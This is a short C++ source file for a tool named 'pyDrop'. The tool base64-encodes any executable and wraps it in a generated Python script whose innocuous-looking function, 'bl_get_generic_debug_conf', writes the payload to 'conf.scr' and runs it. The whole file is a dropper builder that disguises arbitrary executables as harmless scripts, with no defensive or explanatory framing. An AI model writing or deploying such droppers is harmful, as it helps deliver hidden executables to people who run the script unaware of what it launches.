#include <iostream>
#include <vector>
#include <string>
#include <fstream>

#include "b64.h"

void pyDrop(std::string path) {
    std::ifstream inFile(path, std::ios::binary);
    if (!inFile.is_open()) {
        std::cout << "pyDrop ERR: could not open " << path << std::endl;
    }
    std::cout << "pyDrop: Reading executable " << path << std::endl;
    std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    std::string b64Data = base64Encode(buffer);
    buffer.clear();
    std::cout << "pyDrop: Writing python file..." << std::endl;
    std::ofstream outFile("pyDrop-" + path + ".py");
    outFile << "def bl_get_generic_debug_conf():\n";
    outFile << "    import base64\n";
    outFile << "    import subprocess\n";
    outFile << "    b = b'" << b64Data << "'\n";
    outFile << "    d = base64.b64decode(b)\n";
    outFile << "    with open('conf.scr', 'wb') as f:\n";
    outFile << "        f.write(d)\n";
    outFile << "    subprocess.Popen('conf.scr')\n";
    outFile << "bl_get_generic_debug_conf()\n";
    outFile.close();
    std::cout << "pyDrop: Done!" << std::endl;
}